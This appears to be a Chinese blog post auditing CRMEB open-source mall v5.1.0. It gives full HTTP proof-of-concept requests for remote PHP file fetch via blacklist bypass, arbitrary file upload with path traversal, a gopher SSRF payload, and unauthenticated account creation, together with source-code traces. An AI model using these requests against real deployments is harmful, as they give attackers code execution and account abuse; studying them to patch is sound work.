---
title: CRMEB开源版v5.1.0代码审计
date: '2024-04-30 10:23:24'
updated: '2024-04-30 11:18:06'
---
<!--more--> 
# 0x00 前言
CRMEB开源商城系统是一款全开源可商用的系统，由西安众邦网络科技有限公司开发并发布开源版本。
西安众邦网络科技有限公司是一家致力于互联网软件设计、研发、销售为一体的高新技术企业。自2014年成立以来，众邦科技将客户关系管理与电子商务应用场景进行深度集成，围绕新零售、智慧商业、企业数字化经营等课题进行探索创新，打造出中国私有化独立应用电商软件知名品牌——CRMEB。
本篇讲述了PHP代码审计过程中发现的一写漏洞，从反序列化、文件操作、用户认证凭据等方面展开审查，发现不少漏洞问题，小弟在此抛砖引玉。
# 0x01 声明
公网上存在部署了旧版本的CMS，旧版本仍然存在这些问题。
请不要非法攻击别人的服务器，如果你是服务器主人请升级到最新版本。
请严格遵守网络安全法相关条例！此分享主要用于交流学习，请勿用于非法用途，一切后果自付。
一切未经授权的网络攻击均为违法行为，互联网非法外之地。
# 0x02 环境
系统版本：CRMEB开源版v5.1.0
系统环境：Window11
PHP版本：7.4.3NTS
数据库版本：5.7.26
Web服组件务：Nginx1.15.11
源码下载地址：[https://gitee.com/ZhongBangKeJi/CRMEB/releases/tag/v5.1.0](https://gitee.com/ZhongBangKeJi/CRMEB/releases/tag/v5.1.0)
# 0x03 安装
官方教程：[https://doc.crmeb.com/single/crmeb_v4/921](https://doc.crmeb.com/single/crmeb_v4/921)
# 0x04 代码审计
## 【高危】后台远程任意文件拉取（添加直播商品功能）
### 漏洞详情
导致该漏洞产生的问题在于没有对拉取文件后缀进行严格校验，使用黑名单进行匹配是非常不安全的。主要漏洞入口点在实现获取直播商品封面、直播间封面等功能上，不安全的使用`readfile`函数。
### 漏洞复现
准备一个命名为`help.PHP`的文件，内容如下：
```
<?=phpinfo();?>
```
使用 python 开启简单 http 服务，`python -m http.server 19000`
![image.png](../../images/posts/6626ceb92c828955d02d6670c47c933d.png)
_注意服务名和端口，需要自行替换_。
访问后台：`http://localhost:45600/admin`
输入安装时设置好的账号密码登录后台，从左侧栏进入路径`营销->直播管理->直播商品管理`。
`http://localhost:45600/admin/marketing/live/add_live_goods`
![image.png](../../images/posts/6033084e9db8058afa8f1f45c4108c31.png)
完成步骤：`点击添加商品->任意添加商品->生成直播商品`，在点击提交功能时进行抓包。
![image.png](../../images/posts/af07e2fc6231123dfc8335cb1dec2ac5.png)
原始请求数据包：
![image.png](../../images/posts/6827aa97179fe545c256517a5795c7e4.png)
替换其中`image`参数为`http://localhost:19000/help.PHP`并进行发包。可以看到数据包发送后，虽然返回400，实际上已经请求并拉取了`help.PHP`文件。
![image.png](../../images/posts/7adc7c2145545ea2da35afa79e6b198c.png)
POC数据包：
```
POST /adminapi/live/goods/add HTTP/1.1
Host: localhost:45600
Content-Length: 206
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
Accept: application/json, text/plain, */*
Content-Type: application/json;charset=UTF-8
Authori-zation: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwd2QiOiIxZDlmMjExMGZlOTgzM2U1MTQ4MmQyZjdkMTFmZjFlNiIsImlzcyI6ImxvY2FsaG9zdDo0NTYwMCIsImF1ZCI6ImxvY2FsaG9zdDo0NTYwMCIsImlhdCI6MTY5NDA1NjkyMCwibmJmIjoxNjk0MDU2OTIwLCJleHAiOjE2OTY2NDg5MjAsImp0aSI6eyJpZCI6MSwidHlwZSI6ImFkbWluIn19.6gzs6MXyxnHOEckxP4ejuoNJxLpMcT3MdyLRPBAkJ8k
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://localhost:45600
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:45600/admin/marketing/live/add_live_goods
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

{"goods_info":[{"id":4,"image":"http://localhost:19000/help.PHP","store_name":"Apple/苹果iPad mini6 8.3英寸平板电脑 64G-WLAN版 深空灰色","price":"3999.00","cost_price":"3999.00","stock":1600}]}
```
访问 [https://cmd5.com/hash.aspx](https://cmd5.com/hash.aspx) 将 URL`http://localhost:19000/help.PHP` 进行 MD5 编码，得到`749aa9192a0f6ff0ed7c34418e6fe97f`
![image.png](../../images/posts/ced38d5fbf05f83de2fac952256cb0a0.png)
根据默认文件路径规则构造URL：
`http://localhost:45600/uploads/attach/{年份}/{月份}/{日号}/{URL的MD5值}.PHP`
得到：
`http://localhost:45600/uploads/attach/2023/09/07/749aa9192a0f6ff0ed7c34418e6fe97f.PHP`
![image.png](../../images/posts/b10e9c0c76f4d4e36c818b41c1ae01d1.png)
需要注意的是：

1. 使用 apache Web服务器软件下只能解析 php 后缀文件。
2. 使用 nginx Web服务器软件下，在Windows和MacOS系统中不区分大小写匹配。

如果 apache 想要解析大写PHP后缀或者其他后缀，需要添加下面这行代码。
![437938f98c09ce51e6b53925002a657.png](../../images/posts/0eaf03eec7962a589b00120f45d381da.png)
在 nginx 配置中，`~`默认是区分大小写的，如果需要忽略大小写就要使用 `~*`。但在Windows和MacOS系统中不区分，Linux系统区分。
![0a6c025b19c669bdb6da6a3e9289d40.png](../../images/posts/0b40c7daaf4ac916089c9353fdb3c627.png)
### 漏洞审计
利用链路：
```
adminapi/controller/v1/marketing/live/LiveGoods.php add 78行
  services/activity/live/LiveGoodsServices.php add 94行 
    	utils/DownloadImage.php downloadImage 99行
        	services/upload/storage/Local.php down 198行
```
导致漏洞产生的危险函数`readfile`，位于`utils/DownloadImage.php`第99行。
![image.png](../../images/posts/2c96987535a7e70b11eee212407f0590.png)
流程函数为`downloadImage`，接受两个形参，其中`$url`最终传入`readfile`。在此之前存在一个条件判断，用黑名单校验文件后缀。
只是简单使用`in_array`来判断后缀名是否是`['php', 'js', 'html']`，如果是，就退出。**所以无论我们是使用大小写还是**`**::DATA**`**等方式进行绕过都是可以的。**
```
if (in_array($ext, ['php', 'js', 'html'])) {
    throw new AdminException(400558);
}
```
![image.png](../../images/posts/45125333793cf0e3e56608ab849ecb40.png)
文件名和后缀都是通过`getImageExtname`函数获取的，位于`utils/DownloadImage.php`第50行。

1. 去掉URL中`?`之后的部分
2. 通过`.`分割URL，取最后一个数组成员。

假设我们输入`http://localhost:19000/help.PHP?a=1&b=1`
那么到了第62行时`$ext_name`的值为`PHP`，`$url`的值为`http://localhost:19000/help.PHP`
这里的文件名并不是随机产生的，而是通过对我们输入的URL进行md5编码。相当于：
`md5(http://localhost:19000/help.PHP).PHP`
![image.png](../../images/posts/ac4a30c3d4e610c6e55cca4ae781448b.png)
回头看`downloadImage`函数，在`readfile`远程读取完文件内容后，进入`down`函数来保存文件。
![image.png](../../images/posts/0244acd7b340becea16da046f1905a53.png)
`down`函数位于`services/upload/storage/Local.php`第198行。最终使用`file_put_contents`来保存文件。
![image.png](../../images/posts/a77ab19157922cc0a50d005e275fcbf7.png)
`downloadImage`函数存在7个用法，其中2个都属于营销直播内的功能点。
![image.png](../../images/posts/07b32ecd06d7202d5ab96a3ce2e4bbec.png)
添加直播商品功能点函数`add`，位于`services/activity/live/LiveGoodsServices.php`第94行。传入`downloadImage`函数的URL是通过形参`$goods_info`传入的。
![image.png](../../images/posts/6d0c6d34b5206b5c92dcd5981943289a.png)
继续向上寻找到调用方法`add`，位于`adminapi/controller/v1/marketing/live/LiveGoods.php`第78行
![image.png](../../images/posts/dc11736533eaa3b81848e051dd8f9b3e.png)
在`adminapi/route/live.php`中可以找到对应路由：
![image.png](../../images/posts/e9a632fc3794e8ae1c11b7ad624a3507.png)
## 【高危】后台远程任意文件拉取（网络图片上传功能）
### 漏洞详情
导致该漏洞产生的问题在于没有对拉取文件后缀进行严格校验，使用黑名单进行匹配是非常不安全的。主要漏洞入口点在网络图片上传功能上，不安全的使用`readfile`函数。
### 漏洞复现
准备一个命名为`help.PHP`的文件，内容如下：
```
<?=phpinfo();?>
```
使用 python 开启简单 http 服务，`python -m http.server 19000`
![image.png](../../images/posts/6626ceb92c828955d02d6670c47c933d.png)
_注意服务名和端口，需要自行替换_。
访问后台：`http://localhost:45600/admin`
输入安装时设置好的账号密码登录后台，从左侧栏进入路径`商品->商品管理->添加商品`
`http://localhost:45600/admin/product/add_product`
![image.png](../../images/posts/859c6c5f942cb1022d64bb1aefc04277.png)
完成步骤：`点击商品轮播图->在上传商品图窗口点击上传图片`
![image.png](../../images/posts/52562ddf1595722cbd036a7564c96fbc.png)
完成步骤：`在上传图片窗口点击网络上传选项->点击提取图片->点击确定`
![image.png](../../images/posts/3745bdcf32fc74c4593e87dbef22b738.png)
上传后可以在上传商品图找到文件路径。
![image.png](../../images/posts/d47a7d1a6ce5c07c52e29cf11f81747b.png)
也可以通过观察
`http://localhost:45600/adminapi/file/file?pid=&real_name=&page=1&limit=18`
接口返回的数据中找到文件访问路径。
![image.png](../../images/posts/737ab8f5f3bd1a63b0521322c723eb69.png)
POC数据包：
```
POST /adminapi/file/online_upload HTTP/1.1
Host: localhost:45600
Content-Length: 55
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
Accept: application/json, text/plain, */*
Content-Type: application/json;charset=UTF-8
Authori-zation: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwd2QiOiIxZDlmMjExMGZlOTgzM2U1MTQ4MmQyZjdkMTFmZjFlNiIsImlzcyI6ImxvY2FsaG9zdDo0NTYwMCIsImF1ZCI6ImxvY2FsaG9zdDo0NTYwMCIsImlhdCI6MTY5NDA1NjkyMCwibmJmIjoxNjk0MDU2OTIwLCJleHAiOjE2OTY2NDg5MjAsImp0aSI6eyJpZCI6MSwidHlwZSI6ImFkbWluIn19.6gzs6MXyxnHOEckxP4ejuoNJxLpMcT3MdyLRPBAkJ8k
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://localhost:45600
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:45600/admin/marketing/live/add_live_room
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: cb_lang=zh-cn; PHPSESSID=23b220209fa9cd4879a5173dc74c2bba; uuid=1; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwd2QiOiIxZDlmMjExMGZlOTgzM2U1MTQ4MmQyZjdkMTFmZjFlNiIsImlzcyI6ImxvY2FsaG9zdDo0NTYwMCIsImF1ZCI6ImxvY2FsaG9zdDo0NTYwMCIsImlhdCI6MTY5NDA1NjkyMCwibmJmIjoxNjk0MDU2OTIwLCJleHAiOjE2OTY2NDg5MjAsImp0aSI6eyJpZCI6MSwidHlwZSI6ImFkbWluIn19.6gzs6MXyxnHOEckxP4ejuoNJxLpMcT3MdyLRPBAkJ8k; expires_time=1696648920; WS_ADMIN_URL=ws://localhost:45600/notice; WS_CHAT_URL=ws://localhost:45600/msg
Connection: close

{"pid":"","images":["http://localhost:19000/help.PHP"]}
```
访问
`http://localhost:45600/uploads/attach/2023/09/07/749aa9192a0f6ff0ed7c34418e6fe97f.PHP`
![image.png](../../images/posts/3bd4676ed78fe72257ae54b5f89d8703.png)
### 漏洞审计
利用链路：
```
adminapi/controller/v1/file/SystemAttachment.php onlineUpload 198行
	services/system/attachment/SystemAttachmentServices.php onlineUpload  311行
    	services/product/product/CopyTaobaoServices.php downloadImage 311行
        	services/upload/storage/Local.php steam 167行
```
导致漏洞产生的危险函数`readfile`，位于`services/product/product/CopyTaobaoServices.php`第311行。
![image.png](../../images/posts/8a6b0ed45108e7699052957555a4dbc9.png)
流程函数为`downloadImage`，接受七个形参，但实际上只使用了`$url`，最终传入`readfile`。在此之前存在一个条件判断，用黑名单校验文件后缀。
只是简单使用`in_array`来判断后缀名是否是`['php', 'js', 'html']`，如果是，就退出。**所以无论我们是使用大小写还是**`**::DATA**`**等方式进行绕过都是可以的。**
```
if (in_array($ext, ['php', 'js', 'html'])) {
    throw new AdminException(400558);
}
```
![image.png](../../images/posts/b57e4223b44bc5b4160b86f6a6d76465.png)
文件名和后缀都是通过`getImageExtname`函数获取的，位于`services/product/product/CopyTaobaoServices.php`第342行。

1. 去掉URL中`?`之后的部分
2. 通过`.`分割URL，取最后一个数组成员。

假设我们输入`http://localhost:19000/help.PHP?a=1&b=1`
那么到了第353行时`$ext_name`的值为`PHP`，`$url`的值为`http://localhost:19000/help.PHP`
这里的文件名并不是随机产生的，而是通过对我们输入的URL进行md5编码。相当于：
`md5(http://localhost:19000/help.PHP).PHP`
![image.png](../../images/posts/b5e529c3bc481128908d472e38b87b63.png)
回头看`downloadImage`函数，在`readfile`远程读取完文件内容后，进入`stream`函数来保存文件。
![image.png](../../images/posts/c5ad62226fde725879c3164252434cbf.png)
`stream`函数位于`services/upload/storage/Local.php`第167行。最终使用`file_put_contents`来保存文件。
![image.png](../../images/posts/808ed611cfd5475d8c3fd1ff94f52a91.png)
网络图片上传功能点函数`onlineUpload`，位于`services/system/attachment/SystemAttachmentServices.php`第311行。传入`downloadImage`函数的URL是通过形参`$data`传入的。
![image.png](../../images/posts/f1567a119443e27bfd8e25162f33ae57.png)
继续向上寻找到调用方法`onlineUpload`，位于`adminapi/controller/v1/file/SystemAttachment.php`第198行
![image.png](../../images/posts/52aff878d7d4a80071b48059283529f2.png)
从`adminapi/route/file.php`可以找到对应路由：
![image.png](../../images/posts/7cae81be9769825e5f747d1e67216f8f.png)
## 【高危】后台远程任意文件拉取（添加商品）
### 漏洞详情
导致该漏洞产生的问题在于没有对拉取文件后缀进行严格校验，使用黑名单进行匹配是非常不安全的。主要漏洞入口点在添加商品功能上，不安全的使用`readfile`函数。
### 漏洞复现
准备一个命名为`help.PHP`的文件，内容如下：
```
<?=phpinfo();?>
```
使用 python 开启简单 http 服务，`python -m http.server 19000`
![image.png](../../images/posts/6626ceb92c828955d02d6670c47c933d.png)
_注意服务名和端口，需要自行替换_。
访问后台：`http://localhost:45600/admin`
输入安装时设置好的账号密码登录后台，从左侧栏进入路径`商品->商品管理->添加商品`
`http://localhost:45600/admin/product/add_product`
![image.png](../../images/posts/859c6c5f942cb1022d64bb1aefc04277.png)
**步骤一**
填写商品基础信息，任意填写。
![image.png](../../images/posts/b1e746575804afebbc7497359c0b9a8f.png)
**步骤二**

1. 进入商品详情界面，点击编辑器的HTML按钮。
2. 填写payload
```
<img src="http://localhost:19000/help.PHP?233">
```
![image.png](../../images/posts/95dbf602c90ba410b46aa0b99f10dcb3.png)
![image.png](../../images/posts/c8e467d637b4d968828139db88c66b90.png)
**步骤三**
进入其他设置选项，点击保存并抓包。
![image.png](../../images/posts/c4779ee9aa357912a06b9cdffd05a47f.png)
原始数据包：
![image.png](../../images/posts/a8765ce66ceed37c65db988dfb6697b9.png)
修改`slider_image`和`attrs`的值为`http://localhost:19000/help.PHP`。这里添加了`?123`是为了方便判断请求。
![image.png](../../images/posts/28f8f2b154194f1d144df27347c27a4a.png)
同时修改`type`的值为`-1`后进行发包，观察HTTP服务，可以看到这三个地方都触发了远程文件拉取。
![image.png](../../images/posts/471584c14a1108eb809a5157808cfd00.png)
访问 [https://cmd5.com/hash.aspx](https://cmd5.com/hash.aspx) 将 URL`http://localhost:19000/help.PHP` 进行 MD5 编码，得到`749aa9192a0f6ff0ed7c34418e6fe97f`
![image.png](../../images/posts/ced38d5fbf05f83de2fac952256cb0a0.png)
根据默认文件路径规则构造URL：
`http://localhost:45600/uploads/attach/{年份}/{月份}/{日号}/{URL的MD5值}.PHP`
得到：
`http://localhost:45600/uploads/attach/2023/09/07/749aa9192a0f6ff0ed7c34418e6fe97f.PHP`
![image.png](../../images/posts/b10e9c0c76f4d4e36c818b41c1ae01d1.png)
也可以通过观察
`http://localhost:45600/adminapi/file/file?pid=&real_name=&page=1&limit=18`
接口返回的数据中找到文件访问路径。
![image.png](../../images/posts/737ab8f5f3bd1a63b0521322c723eb69.png)
### 漏洞审计
利用链路：
```
adminapi/controller/v1/product/StoreProduct.php save 243行
	services/product/product/StoreProductServices.php save  506行
  	services/product/product/CopyTaobaoServices.php downloadCopyImage 392行
      	services/product/product/CopyTaobaoServices.php downloadImage 311行
          	services/upload/storage/Local.php steam 167行
```
导致漏洞产生的危险函数`readfile`，位于`services/product/product/CopyTaobaoServices.php`第311行。
![image.png](../../images/posts/8a6b0ed45108e7699052957555a4dbc9.png)
流程函数为`downloadImage`，接受七个形参，但实际上只使用了`$url`，最终传入`readfile`。在此之前存在一个条件判断，用黑名单校验文件后缀。
只是简单使用`in_array`来判断后缀名是否是`['php', 'js', 'html']`，如果是，就退出。**所以无论我们是使用大小写还是**`**::DATA**`**等方式进行绕过都是可以的。**
```
if (in_array($ext, ['php', 'js', 'html'])) {
    throw new AdminException(400558);
}
```
![image.png](../../images/posts/b57e4223b44bc5b4160b86f6a6d76465.png)
文件名和后缀都是通过`getImageExtname`函数获取的，位于`services/product/product/CopyTaobaoServices.php`第342行。

1. 去掉URL中`?`之后的部分
2. 通过`.`分割URL，取最后一个数组成员。

假设我们输入`http://localhost:19000/help.PHP?a=1&b=1`
那么到了第353行时`$ext_name`的值为`PHP`，`$url`的值为`http://localhost:19000/help.PHP`
这里的文件名并不是随机产生的，而是通过对我们输入的URL进行md5编码。相当于：
`md5(http://localhost:19000/help.PHP).PHP`
![image.png](../../images/posts/b5e529c3bc481128908d472e38b87b63.png)
回头看`downloadImage`函数，在`readfile`远程读取完文件内容后，进入`stream`函数来保存文件。
![image.png](../../images/posts/c5ad62226fde725879c3164252434cbf.png)
`stream`函数位于`services/upload/storage/Local.php`第167行。最终使用`file_put_contents`来保存文件。
![image.png](../../images/posts/808ed611cfd5475d8c3fd1ff94f52a91.png)
观察`downloadImage`函数调用处在`downloadCopyImage`函数内，位于`services/product/product/CopyTaobaoServices.php`第392行。这里的`$image`变量没有校验直接传入`downloadImage`函数中。
![image.png](../../images/posts/975679ee47706d055c2dfdb2d6cf8abc.png)
找到三处调用`downloadCopyImage`函数的`save`方法，位于`services/product/product/StoreProductServices.php`第506行。
![image.png](../../images/posts/3f247524b5d824dd247d261b31f11e5f.png)
`save`函数接收两个形参，POST的数据通过`$data`传入。其中进入`downloadCopyImage`函数前有一个判断`$type == -1`的判断，只需要确保他的校验通过即可。
![image.png](../../images/posts/868fe7c34f59a9d2a85bcc1ecc4ca25c.png)
进一步向上寻找到调用方法`save`，位于`adminapi/controller/v1/product/StoreProduct.php`第243行。这里确定了`id`必须为`int`类型，同时将POST参数传入`StoreProductServices.php`的`save`函数中去。
![image.png](../../images/posts/b1d5a12083fe736101a3ae00b7c232e2.png)
从`adminapi/route/product.php`可以找到对应路由：
![image.png](../../images/posts/43823b10f95bb336e3886ed6823fe721.png)
## 【高危】后台任意文件上传（视频上传功能）
### 漏洞详情
导致该漏洞产生的问题在于没有对上传文件后缀进行严格校验，对文件名进行了白名单校验，但路径拼接时使用了未经验证的数据进行拼接。主要功能点为视频上传功能，不安全的使用`move_uploaded_file`危险函数。
### 漏洞复现
_注意服务名和端口，需要自行替换_。
访问后台：`http://localhost:45600/admin`
输入安装时设置好的账号密码登录后台，从左侧栏进入路径`商品->商品管理->添加商品`
`http://localhost:45600/admin/cms/article/add_article`
![image.png](../../images/posts/b5a17667b87a6c9b901036a051dd901c.png)
完成步骤：`点击文章内容编辑器的上传视频按钮->任意上传MP4后缀文件->点击确定`，在点击提交功能时进行抓包。![image.png](../../images/posts/4af05e1fe1321390bccc25be7efadcab.png)
原始请求数据包：
![image.png](../../images/posts/38b1576a9edbd002fc1e0b0c04edc42d.png)
修改`chunkNumber`参数为`.php`，修改`blob`参数为PHP代码：`<?=phpinfo();?>`
![image.png](../../images/posts/e372c3c7cf68946071d654f25ec8ad58.png)
POC数据包：
```
POST /adminapi/file/video_upload?XDEBUG_SESSION_START=13429 HTTP/1.1
Host: localhost:45600
Content-Length: 842
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
Accept: application/json, text/plain, */*
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBCTWThi2iCHWlO8M
Authori-zation: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwd2QiOiIxZDlmMjExMGZlOTgzM2U1MTQ4MmQyZjdkMTFmZjFlNiIsImlzcyI6ImxvY2FsaG9zdDo0NTYwMCIsImF1ZCI6ImxvY2FsaG9zdDo0NTYwMCIsImlhdCI6MTY5NDA1NjkyMCwibmJmIjoxNjk0MDU2OTIwLCJleHAiOjE2OTY2NDg5MjAsImp0aSI6eyJpZCI6MSwidHlwZSI6ImFkbWluIn19.6gzs6MXyxnHOEckxP4ejuoNJxLpMcT3MdyLRPBAkJ8k
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://localhost:45600
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:45600/admin/cms/article/add_article
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: cb_lang=zh-cn; PHPSESSID=23b220209fa9cd4879a5173dc74c2bba; uuid=1; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwd2QiOiIxZDlmMjExMGZlOTgzM2U1MTQ4MmQyZjdkMTFmZjFlNiIsImlzcyI6ImxvY2FsaG9zdDo0NTYwMCIsImF1ZCI6ImxvY2FsaG9zdDo0NTYwMCIsImlhdCI6MTY5NDA1NjkyMCwibmJmIjoxNjk0MDU2OTIwLCJleHAiOjE2OTY2NDg5MjAsImp0aSI6eyJpZCI6MSwidHlwZSI6ImFkbWluIn19.6gzs6MXyxnHOEckxP4ejuoNJxLpMcT3MdyLRPBAkJ8k; expires_time=1696648920; WS_ADMIN_URL=ws://localhost:45600/notice; WS_CHAT_URL=ws://localhost:45600/msg;XDEBUG_SESSION_START=13429;
Connection: close

------WebKitFormBoundaryBCTWThi2iCHWlO8M
Content-Disposition: form-data; name="chunkNumber"

.php
------WebKitFormBoundaryBCTWThi2iCHWlO8M
Content-Disposition: form-data; name="chunkSize"

3145728
------WebKitFormBoundaryBCTWThi2iCHWlO8M
Content-Disposition: form-data; name="currentChunkSize"

52
------WebKitFormBoundaryBCTWThi2iCHWlO8M
Content-Disposition: form-data; name="file"; filename="blob"
Content-Type: application/octet-stream

<?=phpinfo();?>
------WebKitFormBoundaryBCTWThi2iCHWlO8M
Content-Disposition: form-data; name="filename"

token.mp4
------WebKitFormBoundaryBCTWThi2iCHWlO8M
Content-Disposition: form-data; name="totalChunks"

1
------WebKitFormBoundaryBCTWThi2iCHWlO8M
Content-Disposition: form-data; name="md5"

6a2d9342b9afb96e10fef23910e0e1eb
------WebKitFormBoundaryBCTWThi2iCHWlO8M--

```
文件路径规则为
`http://localhost:45600/uploads/attach/${年份}/${月份}/${日号}/${filename}__.php`
得到
`http://localhost:45600/uploads/attach/2023/09/07/token.mp4__.php`
![image.png](../../images/posts/ea986a1bd4a55218e024657010187373.png)
通过给`filename`添加路径穿越符号可以上传到上层目录，或者指定目录。
![image.png](../../images/posts/f4a46f33469c78b4d3c9a0846c49851d.png)
发送后上传到了 uploads 文件夹下，完成了路径穿越攻击。
![image.png](../../images/posts/5361098164eaf880ba26ad8497dff4f6.png)
### 漏洞审计
利用链路：
```
services/system/attachment/SystemAttachmentServices.php videoUpload 261行
  	adminapi/controller/v1/file/SystemAttachment.php videoUpload 136行
```
危险函数`move_uploaded_file`位于`services/system/attachment/SystemAttachmentServices.php`第261行。流程函数`videoUpload`，接受两个形参：

1. `$data`记录POST请求参数（form-data）
2. `$file`记录请求中的文件（application/octet-stream）

![image.png](../../images/posts/7f38c5aa84f1c68f253256972611088a.png)
这里对请求参数`filename`进行了白名单校验。必须要有后缀名，且后缀在白名单之内。`token.mp4`显然符合这个条件。
```
if (isset($pathinfo['extension']) && !in_array($pathinfo['extension'], ['avi', 'mp4', 'wmv', 'rm', 'mpg', 'mpeg', 'mov', 'flv', 'swf'])) {
    throw new AdminException(400558);
}
```
在进行路径拼接时使用了`$data['filename']`和`$data['chunkNumber']`。`filename`经过了过滤，但是`chunkNumber`没有。这个参数就是污染点，可以传入`.php`。
```
$filename = $all_dir . '/' . $data['filename'] . '__' . $data['chunkNumber'];
move_uploaded_file($file['tmp_name'], $filename);
```
`$data['filename']`不是通过封装类获取，且只进行了后缀校验，没有过滤路径穿越的问题，导致我们可以任意上传任意文件到任意目录下。
![image.png](../../images/posts/b0e7d4aeaf5e2172b14ec5783367c854.png)
向上寻找到调用方法`videoUpload`，位于`adminapi/controller/v1/file/SystemAttachment.php`第136行。这里写明`$data`是从POST请求体内容获取的，这里没有进行数据类型校验。
![image.png](../../images/posts/93727b3ff29083b8c1e589f3e38a415a.png)
从`adminapi/route/file.php`可以找到对应路由：
![image.png](../../images/posts/f42d95e289d1ae93c621b631940ab369.png)
## 【中危】前台SSRF（获取图片base64功能） 
### 漏洞详情
在实现远程获取图片base64功能上，不安全的使用了`curl_exec`函数。没有对传入的URL进行严格过滤，`curl_exec`允许多种协议请求，容易忽略解析`?`、`#`从而绕过安全校验。
### 漏洞复现
使用gopher协议发送请求：
![image.png](../../images/posts/04ab8e863ebd44db1144406609469de9.png)
需要替换 code 为payload，如果没有接收到请求，将 payload 替换到 image 变量也是可以的。
POC请求包：
```
POST /api/image_base64 HTTP/1.1
Host: localhost:45600
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
Accept: application/json, text/plain, */*
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
sec-ch-ua-platform: "Windows"
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/json;charset=UTF-8
Content-Length: 258

{"image":"?.jpg","code":"gopher://127.0.0.1:18000/_POST%20%2Fflag.php%20HTTP%2F1.1%0A%0DHost%3A%20127.0.0.1%3A18000%0A%0DContent-Type%3A%20application%2Fx-www-form-urlencoded%0A%0DContent-Length%3A%2036%0A%0D%0A%0Dkey%3D00f001523d0b955749ea5e3b0ca09b5f.jpg"}
```
### 漏洞审计
利用链路：
```
services/system/attachment/SystemAttachmentServices.php videoUpload 261行
  	adminapi/controller/v1/file/SystemAttachment.php videoUpload 136行
```
定位到危险函数`curl_exec`，流程函数为`image_to_base64`，位于`common.php`第530行。这里的使用了`parse_url`进一步限制了协议的使用，因为某些协议无法通过`$url['host']`的形式获取。
```
$url = parse_url($avatar);
$url = $url['host'];
```
可以获取`host`的协议有：
```
zip:///path/to/myfile.zip#file.txt
phar://path/to/myapp.phar/some/script.php
gopher://gopher.example.com/0example
ldap://ldap.example.com/dc=example,dc=com
file://C:/path/to/file
ftp://username:password@ftp.example.com/path/to/file
http://www.example.com/path/to/resource
https://www.example.com:8080/path/to/resource
```
![image.png](../../images/posts/e4bcfe909f775ad3212eea9fcf459be2.png)
向上寻找到调用函数`get_image_base64`，位于`api/controller/v1/PublicController.php`第302行。
这里接收两个参数，从提示看都是URL字符串。
![image.png](../../images/posts/a4b518506ffe262337577830337771ca.png)
这里共有两处调用，我们先来看先决条件：

1. 两个变量内容不能为空
2. 两个变量内容要已图片文件后缀名作为结尾
3. 两个变量内容不能包含`phar://`
```
if ($imageUrl !== '' && !preg_match('/.*(\.png|\.jpg|\.jpeg|\.gif)$/', $imageUrl) && strpos($imageUrl, "phar://") !== false) {
    return app('json')->success(['code' => false, 'image' => false]);
}
if ($codeUrl !== '' && !(preg_match('/.*(\.png|\.jpg|\.jpeg|\.gif)$/', $codeUrl) || strpos($codeUrl, 'https://mp.weixin.qq.com/cgi-bin/showqrcode') !== false) && strpos($codeUrl, "phar://") !== false) {
    return app('json')->success(['code' => false, 'image' => false]);
}
```
通过条件后就会进入到`CacheService::remember`的第二参数的匿名函数内，这里如果以同样的URL字符串写入`remember`不会触发匿名函数——**输入的参数不能和上一次请求相同**
从`api/route/v1.php`可以找到对应路由：
![image.png](../../images/posts/426c1ec42c2b8f16643efb843640ee60.png)
## 【中危】任意用户注册（apple快捷登陆） 
### 漏洞详情
新建用户的方式有很多，其中apple快捷登陆，没有进一步确认用户身份，默认不开启强制手机号注册，导致只需要提供 openId 就能创建新用户。
### 漏洞复现
对`http://localhost:45600/api/apple_login`发起请求，修改`openId`为随机数值。
```
POST /api/apple_login HTTP/1.1
Host: localhost:45600
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
Accept: application/json, text/plain, */*
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
sec-ch-ua-platform: "Windows"
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/json;charset=UTF-8
Content-Length: 28

{"openId":"asdasdasdqweqwe"}
```
发送请求包后即可获得Token。
